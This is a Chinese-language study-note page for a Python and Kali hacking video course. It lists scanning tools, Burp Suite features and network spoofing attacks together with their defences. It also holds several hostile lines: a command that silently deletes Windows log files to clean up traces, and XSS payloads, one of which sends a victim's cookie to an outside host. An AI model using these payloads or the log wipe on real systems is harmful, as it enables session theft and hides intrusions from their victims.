# [乾颐堂](https://www.qytang.com/) Python+Kali黑客全套教程

## 0x00 视频 + 源码 + PDF

- videos
  - [Python+Kali黑客全套教程，全程干货+实战技术，小白学习从入门到入狱](https://www.bilibili.com/video/BV17V4y157ih/?spm_id_from=333.337.search-card.all.click&vd_source=7f220845f0d7bc792a045e75a5ac8b8d)
  - [python+kali的全套黑客编程实践教程，全知识点+实践练习，（针对小白/python/kali/网络安全）](https://www.bilibili.com/video/BV1bG4y1H784/?spm_id_from=333.337.search-card.all.click&vd_source=7f220845f0d7bc792a045e75a5ac8b8d)
  - [Python+Kali黑客全套教程，全程干货+实战技术，小白学习从入门到入狱](https://www.bilibili.com/video/BV17V4y157ih/?vd_source=7f220845f0d7bc792a045e75a5ac8b8d#reply136957487232)

- 源码 + PDF

  需要 + up 主 wx

- PDF

  暂存本地 [python&kali 教程](待定)



## 0x01 简单记录

<!--last modify: 20230922-->

- 扫描工具

  ping  /  fping / nping / arping / nbtscan / onesixtyone

- python + nmap

  ```tex
  # https://pypi.org/project/python-nmap/
  # pip install python-nmap
  # import nmap
  ```

  - pypi 中有相关使用方法

- 痕迹清理

  ```shell
  del %WINDIR%\*.log /a/s/q/f # 强制静默删除只读文件
  ```

- nexpose api

  ```tex
  https://<host>:<port>/api/api-version/xml
  ```

- 协议攻击

  ```tex
  mac 泛洪 + mac 欺骗
      macof
      # 防御 port security 技术
  
  dhcp 攻击
      pig.py 干掉合法dhcp 服务器
      非法dhcp 服务器开始干活儿
      # 防御 dhcp snooping 技术
  
  arp 攻击
      arpspoof
      # 防御 DAI 技术
  
  dns spoofing
      ettercap # dns 欺骗
      set # 社会工程学
  ```

- windows 沙盒探测



- 工具

  ```tex
  BurpSuite
  	Proxy 代理 / Intruder 攻击 / Repeater 重放
      Comparer 可比较两个不同请求页面的响应区别
      Spider 手工爬取+自动爬取
      Scanner 手工+自动
      Sequencer 自动确认Cookies 随机性
      Decoder + Extender 编/解码(绕过) + 扩展(WAF 绕过等)
  ```

- XSS POC & 攻击技巧

  ```tex
  # 手工改确认
  	1- 脚本：<script>alert('xss')</script>
  	2- 超链接：<a href='' onclick=alert('xss')>click it</a>
  	3- 图片：<img src=http://172.16.1.23/a.jpgg onerror=alert('xss')>
  	4- 重定向：<script>window.location="http://www.qytphp.com/was/xss.html"</script>
  	5- iframe：<iframe width=300 height=100 src="http://dvwa.qytang.com/vul/xss_r/?name=<script>window.location='http://www.qytphp.com/was/cookie.php?sid='%2Bdocumet.cookie;</script>"></iframe>
  	6- DOM：<script>document.body.ierHTML="<div style=visibility.visible;><br/><br/><h1>QYTAG</h1></div>";</script>
  
  # 攻击技巧
  	1- hook
  	2- keylogger
  ```

  
